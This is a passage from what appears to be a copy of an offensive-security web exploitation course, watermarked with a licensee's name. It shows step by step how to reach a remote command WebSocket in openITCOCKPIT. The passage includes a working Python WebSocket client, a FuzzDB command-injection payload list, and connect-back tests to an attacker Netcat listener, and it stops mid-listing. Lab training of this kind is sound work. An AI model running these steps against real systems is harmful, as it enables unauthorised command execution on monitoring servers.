"pass":[],"plugin":"","controller":"commands","action":"index"},"Types":{"CODE_SUCCESS
":"success","CODE_ERROR":"error","CODE_EXCEPTION":"exception","CODE_MISSING_PARAMETERS
":"missing_parameters","CODE_NOT_AUTHENTICATED":"not_authenticated","CODE_AUTHENTICATI
ON_FAILED":"authentication_failed","CODE_VALIDATION_FAILED":"validation_failed","CODE_
NOT_ALLOWED":"not_allowed","CODE_NOT_AVAILABLE":"not_available","CODE_INVALID_TRIGGER_
ACTION_ID":"invalid_trigger_action_id","ROLE_ADMIN":"admin","ROLE_EMPLOYEE":"employee"
}}; 
Listing 407 - Commands.html setting appData 
There are two portions of particular interest. First a “websocket_url” is defined, which ends with 
“sudo_server”. 
Next, 
a 
key 
named 
“akey” 
is 
defined 
with 
a 
value 
of 
“1fea123e07f730f76e661bced33a94152378611e”. The combination of a commands route and 
sudo_server WebSocket connection endpoint piques our interest. 
WebSocket216 is a browser-supported communication protocol that uses HTTP for the initial 
connection but then creates a full-duplex connection, allowing for fast communication between 
the client and server. While HTTP is a stateless protocol, WebSocket is stateful. In a properly-built 
solution, the initial HTTP connection would authenticate the user and each subsequent 
WebSocket request would not require authentication. However, due to complexities many 
developers face when programming with the WebSocket protocol, they often “roll their own” 
authentication. In openITCOCKPIT, we see a key is provided in the same object a websocket_url is 
set. We suspect this might be used for authentication. 
WebSocket communication is often overlooked during pentests. Up until recently, Burp Repeater 
did not support WebSocket messages and Burp Intruder still does not. However, WebSocket 
communication can have just as much control over a server as HTTP can. Finding a WebSocket 
endpoint (and in this case a key), can significantly increase the risk profile of an application. 
In a browser-based application, WebSocket connections are initiated via JavaScript. Since 
JavaScript is not compiled, the source defining the WebSocket connection must be located in one 
of the JavaScript files loaded on this page. We can use these files to learn how to communicate 
with the WebSocket server and create our own client. 
 
216 (Wikipedia, 2020), https://en.wikipedia.org/wiki/WebSocket 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
375 
The commands.html page loads many JavaScript files, but most are plugins and libraries. 
However, a cluster of JavaScript files just before the end of the head tag do not seem to load 
plugins or libraries: 
<script src="/vendor/angular/angular.min.js"></script><script src="/js/vendor/vis-
4.21.0/dist/vis.js"></script><script src="/js/scripts/ng.app.js"></script><script 
src="/vendor/javascript-detect-element-resize/jquery.resize.js"></script><script 
src="/vendor/angular-gridster/dist/angular-gridster.min.js"></script><script 
src="/js/lib/angular-nestable.js"></script><script 
src="/js/compressed_angular_services.js"></script><script 
src="/js/compressed_angular_directives.js"></script><script 
src="/js/compressed_angular_controllers.js"></script> 
Listing 408 - Potentially custom JavaScript 
As evidenced by the listing, custom JavaScript is stored in the js folder and not in vendor, plugin, 
or lib. We’ll grep for all script tags that also have a src set, removing any entries that are in the 
vendor, plugin, or lib folders: 
kali@kali:~/scripts/content/openitcockpit$ cat commands.html | grep -E "script.*src" | 
grep -Ev "vendor|lib|plugin" 
<script type="text/javascript" src="/js/app/app_controller.js?v3.7.2"></script> 
<script type="text/javascript" src="/js/compressed_components.js?v3.7.2"></script> 
<script type="text/javascript" src="/js/compressed_controllers.js?v3.7.2"></script> 
</script><script type="text/javascript" 
src="/frontend/js/bootstrap.js?v3.7.2"></script> 
        <script type="text/javascript" src="/js/app/bootstrap.js?v3.7.2"></script> 
        <script type="text/javascript" src="/js/app/layoutfix.js?v3.7.2"></script> 
        <script type="text/javascript" 
src="/smartadmin/js/notification/SmartNotification.js?v3.7.2"></script> 
        <script type="text/javascript" src="/smartadmin/js/demo.js?v3.7.2"></script> 
        <script type="text/javascript" src="/smartadmin/js/app.js?v3.7.2"></script> 
        <script type="text/javascript" 
src="/smartadmin/js/smartwidgets/jarvis.widget.js?v3.7.2"></script> 
Listing 409 - Finding custom JavaScript files 
This leaves us with a more manageable list, but there are some false positives that we can 
remove. The smartadmin folder is an openITCOCKPIT theme (clarified with a Google search), so 
we 
can 
remove 
that. 
We’ll 
save 
the 
final 
list 
of 
custom 
JavaScript 
files 
to 
~/scripts/content/custom_js/list.txt, shown in Listing 410. 
kali@kali:~/scripts/content/custom_js$ cat list.txt  
https://openitcockpit/js/app/app_controller.js 
https://openitcockpit/js/compressed_components.js 
https://openitcockpit/js/compressed_controllers.js 
https://openitcockpit/frontend/js/bootstrap.js 
https://openitcockpit/js/app/bootstrap.js 
https://openitcockpit/js/app/layoutfix.js 
https://openitcockpit/js/compressed_angular_services.js 
https://openitcockpit/js/compressed_angular_directives.js 
https://openitcockpit/js/compressed_angular_controllers.js 
Listing 410 - List of custom JavaScript 
It’s very rare for client-side JavaScript files to be protected behind authentication. For this reason 
we should be able to retrieve the files without authentication. We’ll use wget to download the list 
of custom JavaScript into the custom_js folder: 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
376 
kali@kali:~/scripts/content/custom_js$ wget --no-check-certificate -q -i list.txt 
 
kali@kali:~/scripts/content/custom_js$ ls 
app_controller.js  compressed_angular_controllers.js  compressed_components.js   list 
bootstrap.js       compressed_angular_directives.js   compressed_controllers.js 
bootstrap.js.1     compressed_angular_services.js     layoutfix.js 
Listing 411 - Downloading custom JavaScript 
There are multiple files named bootstrap.js, but the content is minimal and can be ignored. The 
"compressed*“ files contain hard-to-read, compressed, JavaScript code. We’ll use the js-
beautify217 Python script to”pretty-print" the files into uncompressed variants: 
kali@kali:~/scripts/content/custom_js$ sudo pip3 install jsbeautifier 
... 
Successfully built jsbeautifier editorconfig 
Installing collected packages: editorconfig, jsbeautifier 
Successfully installed editorconfig-0.12.2 jsbeautifier-1.10.3 
 
kali@kali:~/scripts/content/custom_js$ mkdir pretty 
 
kali@kali:~/scripts/content/custom_js$ for f in compressed_*.js; do js-beautify $f > 
pretty/"${f//compressed_}"; done; 
Listing 412 - Using js-beautify to make JavaScript readable 
Now that we have a readable version of the custom JavaScript, we can begin reviewing the files. 
Our goal is to determine how the WebSocket server works in order to be able to interact with it. 
From this point forward, we will analyze the uncompressed files. 
10.7.2 Reading and Understanding the JavaScript 
WebSocket communicaton can be initiated with JavaScript by running new WebSocket.218 As we 
search through the files, we’ll use this information to discover clues about the configuration of the 
“sudo_server” WebSocket. 
A manual review of the files leads us to components.js. Lines 1248 to 1331 define the component 
named WebsocketSudoComponent and the functions used to send messages, parse responses, 
and manage the data coming in and going out to the WebSocket server: 
1248  App.Components.WebsocketSudoComponent = Frontend.Component.extend({ 
... 
1273      send: function(json, connection) { 
1274          connection = connection || this._connection; 
1275          connection.send(json) 
1276      }, 
... 
1331  }); 
Listing 413 - Definition of the SudoService 
WebsocketSudoComponent also defines the function for sending messages to the WebSocket 
server. In order to discover the messages that are available to be sent to the server, we can 
 
217 (beautify-web, 2020), https://github.com/beautify-web/js-beautify 
218 (Mozilla, 2020), https://developer.mozilla.org/en-US/docs/Web/API/WebSocket 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
377 
search for any calls to the .send() function. To do this, we’ll grep for “send(” in the uncompressed 
files. 
kali@kali:~/scripts/content/custom_js$ grep -r  "send(" ./ --exclude="compressed*" 
./pretty/angular_services.js: _send(JSON.stringify({ 
./pretty/angular_services.js: _send(JSON.stringify({ 
./pretty/angular_services.js: _connection.send(json) 
./pretty/angular_services.js: _send(json) 
./pretty/angular_services.js: _send(JSON.stringify({ 
./pretty/angular_services.js: _connection.send(json) 
./pretty/angular_services.js: _send(json) 
./pretty/components.js:  connection.send(json) 
./pretty/components.js:  this.send(this.toJson('requestUniqId', '')) 
./pretty/components.js:  this.send(this.toJson('keepAlive', '')) 
./pretty/components.js:  this._connection.send(jsonArr); 
./pretty/controllers.js: 
self.WebsocketSudo.send(self.WebsocketSudo.toJson('5238f8e57e72e81d44119a8ffc3f98ea', 
{ 
./pretty/controllers.js: 
self.WebsocketSudo.send(self.WebsocketSudo.toJson('package_uninstall', { 
./pretty/controllers.js: 
self.WebsocketSudo.send(self.WebsocketSudo.toJson('package_install', { 
./pretty/controllers.js: 
self.WebsocketSudo.send(self.WebsocketSudo.toJson('d41d8cd98f00b204e9800998ecf8427e', 
{ 
./pretty/controllers.js: 
self.WebsocketSudo.send(self.WebsocketSudo.toJson('apt_get_update', '')) 
./pretty/controllers.js: 
this.WebsocketSudo.send(this.WebsocketSudo.toJson('nagiostats', [])) 
... 
./pretty/angular_directives.js:  
SudoService.send(SudoService.toJson('enableOrDisableHostFlapdetection', 
[object.Host.uuid, 1])) 
./pretty/angular_directives.js:  
SudoService.send(SudoService.toJson('enableOrDisableHostFlapdetection', 
[object.Host.uuid, 0])) 
... 
Listing 414 - Rough list of commands 
The output reveals a list of useful commands. Removing the false positives, cleaning up the code, 
and removing duplicate values provides us with the manageable list of commands shown in 
Listing 415. 
./pretty/components.js:         requestUniqId 
./pretty/components.js:         keepAlive 
./pretty/controllers.js:        5238f8e57e72e81d44119a8ffc3f98ea 
./pretty/controllers.js:        package_uninstall 
./pretty/controllers.js:        package_install 
./pretty/controllers.js:        d41d8cd98f00b204e9800998ecf8427e 
./pretty/controllers.js:        apt_get_update 
./pretty/controllers.js:        nagiostats 
./pretty/controllers.js:        execute_nagios_command 
./pretty/angular_directives.js: sendCustomHostNotification 
./pretty/angular_directives.js: submitHoststateAck 
./pretty/angular_directives.js: submitEnableServiceNotifications 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
378 
./pretty/angular_directives.js: commitPassiveResult 
./pretty/angular_directives.js: sendCustomServiceNotification 
./pretty/angular_directives.js: submitDisableServiceNotifications 
./pretty/angular_directives.js: submitDisableHostNotifications 
./pretty/angular_directives.js: enableOrDisableServiceFlapdetection 
./pretty/angular_directives.js: rescheduleService 
./pretty/angular_directives.js: submitServiceDowntime 
./pretty/angular_directives.js: submitHostDowntime 
./pretty/angular_directives.js: commitPassiveServiceResult 
./pretty/angular_directives.js: submitEnableHostNotifications 
./pretty/angular_directives.js: submitServicestateAck 
./pretty/angular_directives.js: rescheduleHost 
./pretty/angular_directives.js: enableOrDisableHostFlapdetection 
Listing 415 - A selection of available commands 
Although many of these seem interesting, the commands specifically listed in controllers.js seem 
to run system-level commands, so this is where we will focus our attention. 
The execute_nagios_command command seems to indicate that it triggers some form of 
command execution. Opening the controllers.js file and searching for “execute_nagios_command” 
leads us to the content found in Listing 416. A closer inspection of this code confirms that this 
function may result in RCE: 
loadConsole: function() { 
    this.$jqconsole = $('#console').jqconsole('', 'nagios$ '); 
    this.$jqconsole.Write(this.getVar('console_welcome')); 
    var startPrompt = function() { 
        var self = this; 
        self.$jqconsole.Prompt(!0, function(input) { 
            
self.WebsocketSudo.send(self.WebsocketSudo.toJson('execute_nagios_command', input)); 
            startPrompt() 
        }) 
    }.bind(this); 
    startPrompt() 
}, 
Listing 416 - LoadConsole function 
This command is used in the loadConsole function where there are also references to jqconsole. 
An input to the prompt is passed directly with “execute_nagios_command”. A quick search for 
jqconsole reveals that it is a jQuery terminal plugin.219 Interesting. 
10.7.2.1 Decoding the Communication 
Now that we have a theory on how we can run code, let’s try to understand the communication 
steps. We will work backwards by looking at what is sent to the send function. We will begin our 
review at the line in controller.js where execute_nagios_command is sent to the send function: 
4691 self.WebsocketSudo.send(self.WebsocketSudo.toJson('execute_nagios_command', 
input)); 
Listing 417 - Argument to execute_nagios_command 
 
219 (Replit, 2019), https://github.com/replit-archive/jq-console 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
379 
Line 4691 of controller.js sends execute_nagios_command along with an input to a function called 
toJson. Let’s inspect what the toJson function does. First, we will discover where the function is 
defined. To do this, we can use grep to search for all instances of toJson, which will return many 
instances. To filter these out, we will use grep with the -v flag and look for the .send keyword. 
kali@kali:~/scripts/content/custom_js$ grep -r  "toJson" ./ --exclude="compressed*" | 
grep -v ".send" 
./components.js:    toJson: function(task, data) { 
./angular_services.js:        toJson: function(task, data) { 
./angular_services.js:        toJson: function(task, data) { 
 
Listing 418 - Searching for toJson 
The search for toJson revealed that the function is set in angular_services.js and components.js. 
The components.js file is the file where we initially found the WebsocketSudoComponent 
component. Since we’ve already found useful information in components.js, we will open the file 
and search for the toJson reference. The definition of toJson can be found in Listing 419 
1310  toJson: function(task, data) { 
1311      var jsonArr = []; 
1312      jsonArr = JSON.stringify({ 
1313          task: task, 
1314          data: data, 
1315          uniqid: this._uniqid, 
1316          key: this._key 
1317      }); 
1318      return jsonArr 
1319  }, 
Listing 419 - Reviewing toJson 
The toJson function takes two arguments: the task (in this case execute_nagios_command) and 
some form of data (in this case input). The function then creates a JSON string of an object that 
contains the task, the data, a unique id, and a key. We know where task and data come from, but 
we must determine the source of uniqid and key. Further investigation reveals that the uniqid is 
defined above the toJson function in a function named _onResponse: 
1283  _onResponse: function(e) { 
1284      var transmitted = JSON.parse(e.data); 
1285      switch (transmitted.type) { 
1286          case 'connection': 
1287              this._uniqid = transmitted.uniqid; 
1288              this.__success(e); 
1289              break; 
1290          case 'response': 
1291              if (this._uniqid === transmitted.uniqid) { 
1292                  this._callback(transmitted) 
1293              } 
1294              break; 
1295          case 'dispatcher': 
1296              this._dispatcher(transmitted); 
1297              break; 
1298          case 'event': 
1299              if (this._uniqid === transmitted.uniqid) { 
1300                  this._event(transmitted) 
1301              } 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
380 
1302              break; 
1303          case 'keepAlive': 
1304              break 
1305      } 
1306  } 
Listing 420 - Discovering how _uniqid is set 
Based on the name, the _onResponse function is executed when a message comes in. The uniqid 
is set to the value provided by the server. We should expect at some point during the connection 
for the server to send us a uniqid value. There also seem to be five types of responses that the 
server will send: connection, response, dispatcher, event, and keepAlive. We will save this 
information for later. 
Now let’s determine the source of the _key value. The setup function in the same components.js 
file provides some clues: 
1260  setup: function(wsURL, key) { 
1261      this._wsUrl = wsURL; 
1262      this._key = key 
1263  }, 
Listing 421 - Discovering how _key is set 
When setup is called, the WebSocket URL and the _key variable in the WebsocketSudo component 
are set. Let’s grep for calls to this function: 
kali@kali:~/scripts/content/custom_js$ grep -r  "setup(" ./ --exclude="compressed*" 
... 
./pretty/controllers.js:    _setupChatListFilter: function() { 
./app_controller.js:        this.ImageChooser.setup(this._dom); 
./app_controller.js:  this.FileChooser.setup(this._dom); 
./app_controller.js:      this.WebsocketSudo.setup(this.getVar('websocket_url'), 
this.getVar('akey')); 
Listing 422 - Searching for setup execution 
Searching for “setup(” returns many function calls, but the last result is the most relevant, and the 
arguments that are being passed in seem familiar as they were set in commands.html. At this 
point, we should have everything we need to construct a execute_nagios_command task. 
However, we should inspect the initial connection process to the WebSocket server to make sure 
we are not missing anything. The connect function in the components.js file is a good place to 
look. 
1264  connect: function() { 
1265      if (this._connection === null) { 
1266          this._connection = new WebSocket(this._wsUrl) 
1267      } 
1268      this._connection.onopen = this._onConnectionOpen.bind(this); 
1269      this._connection.onmessage = this._onResponse.bind(this); 
1270      this._connection.onerror = this._onError.bind(this); 
1271      return this._connection 
1272  }, 
Listing 423 - Reviewing connect function 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
381 
The connect function will first create a new WebSocket connection if one doesn’t exist. Next, it 
sets the onopen, onmessage, and onerror event handlers. The onopen event handler will call the 
_onConnectionOpen function. Let’s take a look at _onConnectionOpen. 
1277 _onConnectionOpen: function(e) { 
1278     this.requestUniqId() 
1279 }, 
... 
1307 requestUniqId: function() { 
1308     this.send(this.toJson('requestUniqId', '')) 
1309 }, 
Listing 424 - Reviewing _onConnectionOpen 
The _onConnectionOpen function only calls the requestUniqId function. The requestUniqId 
function will send a request to the server requesting a unique id. We will have to keep this in mind 
when attempting to interact with the WebSocket server. 
10.7.3 Interacting With the WebSocket Server 
Now that we understand WebSocket requests, we can begin to interact with the server. Although 
Burp can interact with a WebSocket server,220 the user interface is not ideal for our situation. Burp 
also lacks a WebSocket “Intruder”. Because of these limitations, we will instead build our own 
client in Python. 
10.7.4 Building a Client 
First, we will build a script that allows us to connect and send any command as “input”. This will 
help us learn how the server sends its responses. To do this, let’s import modules we’ll need and 
set a few global variables. 
We’ll use the websocket module to communicate with the server, ssl to tell the WebSocket server 
to ignore the bad certificate, the json module to build and parse the requests and responses, 
argparse to allow command line arguments, and thread to allow execution of certain tasks in the 
background. We know that a unique id and key is sent in every request, so we will define those as 
global variables: 
import websocket 
import ssl  
import json 
import argparse 
import _thread as thread 
 
uniqid = "" 
key = "" 
Listing 425 - Importing modules and setting globals 
Next, we will set up the arguments that we’ll pass into the Python script. 
if __name__ == "__main__": 
    parser = argparse.ArgumentParser() 
 
220 (Portswigger, 2020), https://portswigger.net/web-security/websockets 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
382 
 
    parser.add_argument('--url', '-u', 
                        required=True, 
                        dest='url', 
                        help='Websocket URL') 
    parser.add_argument('--key', '-k', 
                        required=True, 
                        dest='key', 
                        help='openITCOCKPIT Key') 
    parser.add_argument('--verbose', '-v', 
                        help='Print more data', 
                        action='store_true') 
    args = parser.parse_args() 
Listing 426 - Setting argument parsing 
We need a url and key argument to configure the connection to the WebSocket server. We will 
also allow for an optional verbose flag, which will assist during debugging. Next, let’s set up the 
connection. 
As shown in Listing 427, we will set the key global variable to the one passed in the argument. 
Next, we will configure verbose tracing if the argument is set, then we will configure the 
connection. We will pass in the URL and set the events to execute the functions that we want in 
WebSocketApp. This means that we will also need to define the four functions (on_message, 
on_error, on_close, and on_open). Finally, we will tell the WebSocket client to connect 
continuously. We will also pass in the ssl options to ignore the self-signed certificate. 
    key = args.key 
    websocket.enableTrace(args.verbose) 
    ws = websocket.WebSocketApp(args.url, 
                              on_message = on_message, 
                              on_error = on_error, 
                              on_close = on_close, 
                              on_open = on_open) 
    ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE}) 
Listing 427 - Configuring the connection 
Now that we have our arguments set up, let’s configure the four functions to handle the events. 
We will start with on_open. 
The on_open function (shown in Listing 428) will access the WebSocket connection as an 
argument. Because we want the connection to stay open, but still allow the server to send us 
messages at any time, we will create a separate thread. The new thread will execute the run 
function, which is defined within the on_open function. Inside of run, we will have a loop that will 
run non-stop to listen for user input. The user’s input will then be converted to the appropriate 
JSON and passed to the send function for the WebSocket connection. 
def on_open(ws): 
    def run(): 
        while True: 
            cmd = input() 
            ws.send(toJson("execute_nagios_command", cmd)) 
    thread.start_new_thread(run, ()) 
Listing 428 - Creating on_open 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
383 
10.7.4.1.1 
 
While the official client did send a request to generate a uniqid on connection, we 
didn’t find this necessary as the server does it automatically. 
Before we move on to the next function to handle events, we will build the toJson function. The 
toJson function (Listing 429) will mirror the official client’s toJson function and will accept the 
task and data we want to send. We will first build a dictionary that contains the task, data, uniqid, 
and key. We’ll then run that dictionary through a function to dump it as a JSON string. 
def toJson(task,data): 
    req = { 
        "task": task, 
        "data": data, 
        "uniqid": uniqid, 
        "key" : key 
    } 
    return json.dumps(req) 
Listing 429 - Creating toJson 
Next, we will create the event handler for on_message. As we learn how the server communicates, 
we will make changes to this function. The on_message event (Listing 430) passes in the 
WebSocket connection and the message that was sent. For now, we will parse the message, set 
the uniqid global variable if the server sent one, and print the raw message. 
def on_message(ws, message): 
    mes = json.loads(message) 
 
    if "uniqid" in mes.keys(): 
        uniqid = mes["uniqid"] 
 
    print(mes) 
Listing 430 - Creating on_message 
With on_message created, we will create the event handlers for on_error and on_close. For 
on_error, we will simply print the error. For on_close, we will just print a message that the 
connection was closed. 
def on_error(ws, error): 
    print(error) 
 
def on_close(ws): 
    print("[+] Connection Closed") 
Listing 431 - Creating on_error and on_close 
With the script completed, we will use it to connect to the server and attempt to send a whoami 
command. 
kali@kali:~/scripts$ python3 wsclient.py --url wss://openitcockpit/sudo_server -k 
1fea123e07f730f76e661bced33a94152378611e -v 
--- request header --- 
GET /sudo_server HTTP/1.1 
Upgrade: websocket 
Connection: Upgrade 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
384 
Host: openitcockpit 
Origin: http://openitcockpit 
Sec-WebSocket-Key: 5E+Srv82go8K6QOoJ6WRUQ== 
Sec-WebSocket-Version: 13 
 
 
----------------------- 
--- response header --- 
HTTP/1.1 101 Switching Protocols 
Server: nginx 
Date: Fri, 21 Feb 2020 16:36:31 GMT 
Connection: upgrade 
Upgrade: websocket 
Sec-WebSocket-Accept: R4BpxrINRQ/cDOErqo4rbxfliaI= 
X-Powered-By: Ratchet/0.4.1 
----------------------- 
{'payload': 'Connection established', 'type': 'connection', 'task': '', 'uniqid': 
'5e50070feeac73.88569350'} 
whoami 
send: 
b'\x81\xf5\x8b\xc1\xa3\x9e\xf0\xe3\xd7\xff\xf8\xaa\x81\xa4\xab\xe3\xc6\xe6\xee\xa2\xd6
\xea\xee\x9e\xcd\xff\xec\xa8\xcc\xed\xd4\xa2\xcc\xf3\xe6\xa0\xcd\xfa\xa9\xed\x83\xbc\x
ef\xa0\xd7\xff\xa9\xfb\x83\xbc\xfc\xa9\xcc\xff\xe6\xa8\x81\xb2\xab\xe3\xd6\xf0\xe2\xb0
\xca\xfa\xa9\xfb\x83\xbc\xa9\xed\x83\xbc\xe0\xa4\xda\xbc\xb1\xe1\x81\xaf\xed\xa4\xc2\x
af\xb9\xf2\xc6\xae\xbc\xa7\x94\xad\xbb\xa7\x94\xa8\xee\xf7\x95\xaf\xe9\xa2\xc6\xfa\xb8
\xf2\xc2\xa7\xbf\xf0\x96\xac\xb8\xf6\x9b\xa8\xba\xf0\xc6\xbc\xf6' 
{'payload': '\x1b[0;31mERROR: Forbidden command!\x1b[0m\n', 'type': 'response', 
'task': '', 'uniqid': '', 'category': 'notification'} 
{'type': 'dispatcher', 'running': False} 
{'type': 'dispatcher', 'running': False} 
^C 
send: b'\x88\x829.J.:\xc6' 
[+] Connection Closed 
Listing 432 - First WebSocket connection 
This initial connection produces a lot of information. First, upon initial connection, the server 
sends a message with a type of “connection” and a payload of “Connection established”. Next, in 
response to the whoami command, the server response contains “Forbidden command!”. Finally, 
the server periodically sends a dispatcher message without a payload. The connection dispatcher 
message types were not valuable, so we can handle those appropriately in the on_message 
function. We also want to clean up the output of the “response” type to only show payload of the 
message. 
Instead of printing the full message (Listing 433), we will print the string “[+] Connected!” if the 
incoming message is a connection. Next, we will ignore the “dispatcher” messages and we will 
print only the payload of a response. Since the payload of our whoami command already 
contained a new line character, we will end the print with an empty string to honor the server’s 
new line. 
def on_message(ws, message): 
    mes = json.loads(message) 
 
    if "uniqid" in mes.keys(): 
        uniqid = mes["uniqid"] 
     
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
385 
    if mes["type"] == "connection": 
        print("[+] Connected!") 
    elif mes["type"] == "dispatcher": 
        pass 
    elif mes["type"] == "response": 
        print(mes["payload"], end = '') 
    else: 
        print(mes) 
Listing 433 - Updating on_message 
With everything updated, we will connect and try again, this time without verbose mode: 
kali@kali:~/scripts$ python3 wsclient.py --url wss://openitcockpit/sudo_server -k 
1fea123e07f730f76e661bced33a94152378611e 
[+] Connected! 
whoami 
ERROR: Forbidden command! 
^C 
[+] Connection Closed 
Listing 434 - Updated connection with output cleaned up 
Now we have an interactive WebSocket connection where we can begin testing the input and 
finding allowed commands. 
10.7.4.2 Exercise 
Fuzz the input to find any allowed commands. Find a good list of common commands. This will 
require changing the script that we just created. Save the new script for fuzzing in a file named 
fuzz.py. You should discover at least one working command. Complete this exercise before 
moving on to the next section as it is required. 
10.7.5 Attempting to Inject Commands 
At this point, we should have discovered that ls is a valid command. Let’s try to escape the 
command using common injection techniques. 
One way to inject into a command is with operators like && and ||, which “stack” commands. The 
&& operator will run a command if the previous command was successful and || will run a 
command if the previous command was unsuccessful. While there are other command injection 
techniques, testing each one individually is unnecessary when we can use a curated list to brute 
force all possible injection techniques. 
For example, Fuzzdb,221 a dictionary of attacks for black box testing, contains a list of possible 
injections. We can download this list directly from GitHub. 
kali@kali:~/scripts$ wget -q https://raw.githubusercontent.com/fuzzdb-
project/fuzzdb/master/attack/os-cmd-execution/command-injection-template.txt 
 
kali@kali:~/scripts$ cat command-injection-template.txt  
{cmd} 
;{cmd} 
 
221 (Adam Muntner, 2020), https://github.com/fuzzdb-project/fuzzdb 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
386 
;{cmd}; 
^{cmd} 
... 
&CMD=$"{cmd}";$CMD 
&&CMD=$"{cmd}";$CMD 
%0DCMD=$"{cmd}";$CMD 
FAIL||CMD=$"{cmd}";$CMD 
<!--#exec cmd="{cmd}"--> 
;system('{cmd}') 
Listing 435 - Downloading the FuzzDB list of commands 
The list uses a template where the {cmd} variable can be replaced. By looping through each of 
these injection templates, sending it to the server, and inspecting the response, we can discover if 
any of the techniques allows for us to inject into the template. 
10.7.5.1 Exercises 
1. 
What error message is displayed when submitting a disallowed character? 
2. 
Edit the fuzzing script to use the command-injection-template.txt file. Replace the {cmd} 
placeholder with a command you want to run (like whoami). Review the output and 
determine if any of the injection techniques worked. 
10.7.6 Digging Deeper 
At this point, we should have determined that none of the command injection techniques worked. 
Now we have to Try Harder. While we cannot inject into a new command, some commands might 
allow us to inject into the arguments. For example, the find command accepts the -exec 
argument, which executes a command on each file found. 
Unfortunately, at this point we only know that the ls command works and it does not accept any 
arguments that allow for arbitrary command execution. But let’s inspect the output of ls a bit 
more carefully. 
The output displays a list of scripts, and after some trial and error, we discover that we can run 
those scripts. 
kali@kali:~/scripts$ python3 wsclient.py --url wss://openitcockpit/sudo_server -k 
1fea123e07f730f76e661bced33a94152378611e 
[+] Connected! 
ls 
... 
check_hpjd 
check_http 
check_icmp 
... 
./check_http 
check_http: Could not parse arguments 
Usage: 
 check_http -H <vhost> | -I <IP-address> [-u <uri>] [-p <port>] 
       [-J <client certificate file>] [-K <private key>] 
       [-w <warn time>] [-c <critical time>] [-t <timeout>] [-L] [-E] [-a auth] 
       [-b proxy_auth] [-f <ok|warning|critcal|follow|sticky|stickyport>] 
       [-e <expect>] [-d string] [-s string] [-l] [-r <regex> | -R <case-insensitive 
regex>] 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
387 
       [-P string] [-m <min_pg_size>:<max_pg_size>] [-4|-6] [-N] [-M <age>] 
       [-A string] [-k string] [-S <version>] [--sni] [-C <warn_age>[,<crit_age>]] 
       [-T <content-type>] [-j method] 
Listing 436 - Trying check_http 
After reviewing the output of all the commands in the current directory, we don’t find any 
argument that allows for direct command execution. However, the check_http command is 
particularly interesting. Reviewing the usage instructions for check_http in Listing 436 reveals that 
it allows us to inject custom headers with the -k argument. The ability to inject custom headers 
into a request is useful as it might provide us a blank slate to interact with local services that are 
not HTTP-based. This is only possible if we can set the IP address of the command to 127.0.0.1, 
can set the port to any value, and can set the header to any value we want. To find if we have this 
level of control, let’s first start a Netcat listener on Kali. 
kali@kali:~$ nc -nvlp 8080 
listening on [any] 8080 ... 
Listing 437 - Starting Netcat listener 
Now we’ll have openITCOCKPIT connect back to us using the check_http command so that we 
can review the data it sends. 
kali@kali:~/scripts$ python3 wsclient.py --url wss://openitcockpit/sudo_server -k 
1fea123e07f730f76e661bced33a94152378611e 
[+] Connected! 
./check_http -I 192.168.119.120 -p 8080 
CRITICAL - Socket timeout after 10 seconds 
Listing 438 - Connecting back to Kali 
The listener displays the data that was received from the connection: 
listening on [any] 8080 ... 
connect to [192.168.119.120] from (UNKNOWN) [192.168.121.129] 34448 
GET / HTTP/1.0 
User-Agent: check_http/v2.1.1 (monitoring-plugins 2.1.1) 
Connection: close 
Listing 439 - Initial HTTP connection 
Now, we will run the same check_http connection but add a header with the -k argument. For 
now, we’ll send just a string, “string1”. 
kali@kali:~/scripts$ python3 wsclient.py --url wss://openitcockpit/sudo_server -k 
1fea123e07f730f76e661bced33a94152378611e 
[+] Connected! 
./check_http -I 192.168.119.120 -p 8080 -k string1 
CRITICAL - Socket timeout after 10 seconds 
Listing 440 - Connecting to Kali with header 
Returning to our listener, we find that the header was added. 
kali@kali:~$ nc -nvlp 8080 
listening on [any] 8080 ... 
connect to [192.168.119.120] from (UNKNOWN) [192.168.121.129] 34508 
GET / HTTP/1.0 
User-Agent: check_http/v2.1.1 (monitoring-plugins 2.1.1) 
OS-555704 RAYMOND ALLEN SORENG
Advanced Web Attacks and Exploitation 
 
 
WEB-300 
Copyright © 2021 Offensive Security Ltd. All rights reserved. 
388 
Connection: close 
string1 
Listing 441 - Connection with header 
Next, we’ll make the header longer, sending the argument -k “string1 string2” (including the 
double quotes) and check our listener: 
kali@kali:~$ nc -nvlp 8080 
listening on [any] 8080 ... 
connect to [192.168.119.120] from (UNKNOWN) [192.168.121.129] 34552 
GET / HTTP/1.1 
